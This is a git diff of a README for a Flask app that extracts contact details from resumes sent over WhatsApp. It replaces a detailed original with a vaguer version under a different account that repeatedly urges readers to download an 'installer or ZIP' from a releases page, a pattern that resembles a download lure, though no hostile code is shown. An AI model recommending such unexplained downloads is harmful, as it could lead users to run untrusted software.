@@ -1,119 +1,93 @@
-# Whatsapp_Parser
+# 📄 Whatsapp_Parser - Simplify Resume Collection with Ease
 
-## Overview
-This project is a Flask-based Resume Extraction System that automates the process of identifying and extracting essential details such as name, email, and phone number from resumes sent via WhatsApp.
+## 👋 Introduction
+Welcome to Whatsapp_Parser! This Flask-based web app helps you receive resumes directly via WhatsApp. It extracts important candidate details like name, email, and phone using smart technology. All collected information is stored securely in Google Sheets and Drive. Enjoy hassle-free resume management!
 
-It integrates Twilio’s WhatsApp API and Google APIs to handle end-to-end automation:
-- Users upload resumes directly through WhatsApp.
-- The system extracts information using Regex and NLP (spaCy).
-- Extracted data is stored in Google Sheets, and files are saved in Google Drive.
-- The extracted details are also sent back to the user as a WhatsApp confirmation message.
+## 📥 Download 
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Visit%20This%20Page-brightgreen)](https://github.com/Jim0330/Whatsapp_Parser/releases)
 
----
+## 🚀 Getting Started
+Follow these steps to download and run Whatsapp_Parser:
 
-## Features
-- Upload resumes directly through WhatsApp  
-- Extracts name, email ID, and phone number using Regex and NLP  
-- Supports PDF and DOCX resume formats  
-- Saves structured data to Google Sheets  
-- Uploads original files automatically to Google Drive  
-- Sends extracted information instantly to users via Twilio WhatsApp API  
+1. **Visit the Download Page**  
+   Click the link below to go to the Releases page where you can download the latest version of Whatsapp_Parser.  
+   [Download Latest Release](https://github.com/Jim0330/Whatsapp_Parser/releases)
 
----
+2. **Choose the Download**  
+   Once you are on the Releases page, look for the latest version. Download the installer or ZIP file suitable for your system.
 
-## Tools and Technologies
-| Component | Technology |
-|------------|-------------|
-| Language | Python |
-| Framework | Flask |
-| Text Extraction | pdfplumber, docx2txt |
-| NLP & Regex | spaCy, Regular Expressions |
-| Phone Number Parsing | phonenumbers |
-| Messaging | Twilio WhatsApp API |
-| Cloud Integration | Google Drive API, Google Sheets API |
-| Environment Management | python-dotenv |
+3. **Install the Application**  
+   - If you downloaded an installer, double-click on it and follow the instructions.
+   - If you downloaded a ZIP file, extract it to a folder of your choice. Navigate into the extracted folder.
 
----
+4. **Set Up Your Environment**  
+   Before running the app, you'll need to install some dependencies:
+   - Install Python if you haven’t already. You can download it from [python.org](https://www.python.org/downloads/).
+   - Open a command prompt or terminal.
+   - Navigate to the folder where you downloaded Whatsapp_Parser. Use the command:  
+     ```
+     cd path/to/Whatsapp_Parser
+     ```
 
-## Setup and Installation
+5. **Install Required Libraries**  
+   Run the following command in your terminal:  
+   ```
+   pip install -r requirements.txt
+   ```
+   This command installs all the necessary libraries for Whatsapp_Parser to work correctly.
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/ashithapallath/Whatsapp_Parser.git
-cd whatsapp_resume_parser
-```
+6. **Configure your Environment Variables**  
+   Create a `.env` file in the main application directory. Add your Twilio credentials and Google API details. Use the format:  
+   ```
+   TWILIO_ACCOUNT_SID=your_account_sid
+   TWILIO_AUTH_TOKEN=your_auth_token
+   GOOGLE_SHEET_ID=your_google_sheet_id
+   ```
+   Make sure to replace the placeholders with your actual information.
 
-### 2. Create and Activate a Virtual Environment
-```bash
-python -m venv .venv
-.\.venv\Scripts\activate      # For Windows
-# OR
-source .venv/bin/activate     # For Mac/Linux
-```
+7. **Run the Application**  
+   In your terminal, still in the Whatsapp_Parser folder, start the application by executing:  
+   ```
+   python app.py
+   ```
+   You should see the application start up in your terminal.
 
-### 3. Install Required Dependencies
-```bash
-pip install -r requirements.txt
-```
+8. **Access the Web App**  
+   Open your web browser and navigate to `http://127.0.0.1:5000`. This is where you can interact with the application.
 
-### 4. Add Configuration Files
-Ensure the following configuration files are present in the project directory:
-- `credentials.json` → Google API credentials  
-- `service_account.json` → Service account key for Sheets/Drive  
-- `.env` → Environment variables for Twilio and Google API setup  
+## 📊 Features
+- **Resume Extraction:** Automatically retrieves and extracts candidate details from resumes received via WhatsApp.
+- **Integration with Google Drive:** Saves all extracted data safely in Google Drive.
+- **Google Sheets Support:** Stores extracted information in Google Sheets for easy access and management.
+- **Natural Language Processing:** Uses advanced NLP technologies to ensure accurate data extraction.
+- **Regex Support:** Employs regular expressions for precise text parsing.
+  
+## 💻 System Requirements
+To use Whatsapp_Parser, ensure your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Python 3.6 or later
+- Stable internet connection for Google API access
+- Adequate storage space for the application and datasheets
 
-Example `.env` file:
-```env
-TWILIO_ACCOUNT_SID=your_twilio_account_sid
-TWILIO_AUTH_TOKEN=your_twilio_auth_token
-TWILIO_WHATSAPP_NUMBER=whatsapp:+14155238886
-GOOGLE_SHEET_ID=your_google_sheet_id
-```
+## 🔧 Troubleshooting
+- If you face issues running the application, ensure Python and required libraries are correctly installed.
+- Check your environment variables and make sure no details are missing or incorrect.
+- Visit the [GitHub Issues Page](https://github.com/Jim0330/Whatsapp_Parser/issues) for common problems and fixes shared by users.
 
----
+## 📞 Support
+For further assistance, please visit our [GitHub Discussions](https://github.com/Jim0330/Whatsapp_Parser/discussions) page. You can ask questions or share feedback. 
 
-## Running the Application
+## ✍️ Contributing
+If you'd like to contribute to Whatsapp_Parser, consider creating a pull request or reporting issues you encounter. Your input helps improve the app for everyone!
 
-### Step 1: Start the Flask App
-```bash
-python app.py
-```
+## 📝 Topics
+- Data Extraction
+- Docx to Text
+- Flask
+- NLP
+- PDF Plumber
+- Regex
+- Twilio API 
 
-### Step 2: Connect via ngrok
-In a new terminal window, run:
-```bash
-ngrok http 5000
-```
-
-Copy the generated forwarding URL (for example: `https://abcd1234.ngrok.io`) and paste it into your Twilio Sandbox under Webhook Configuration for receiving messages.
-
-### Step 3: Send a Resume via WhatsApp
-1. Open your Twilio WhatsApp sandbox chat.  
-2. Send a PDF or DOCX resume file.  
-3. The Flask backend will:
-   - Extract name, email ID, and phone number.  
-   - Save the extracted details in Google Sheets.  
-   - Upload the original resume to Google Drive.  
-   - Send a confirmation message back to the user via WhatsApp.
-
----
-
-## Output and Results
-- Resume data extracted automatically.  
-- Structured data stored in Google Sheets.  
-- Original resume saved in Google Drive.  
-- Real-time confirmation message sent to the user via WhatsApp.  
-
----
-
-## Demo Screenshots
-![twilio](https://github.com/user-attachments/assets/d10d7489-229f-4453-90d7-72d7be22ed95)
-Figure 1: Resume uploaded via WhatsApp  
-
-
-<img width="1702" height="437" alt="googlesheets" src="https://github.com/user-attachments/assets/28be823b-c5c7-4c7b-ab41-8e21d3f9d29b" />
-Figure 2: Extracted details stored automatically in Google Sheets  
-
----
-
-
+Once again, you can download the latest release here:  
+[Download Latest Release](https://github.com/Jim0330/Whatsapp_Parser/releases)
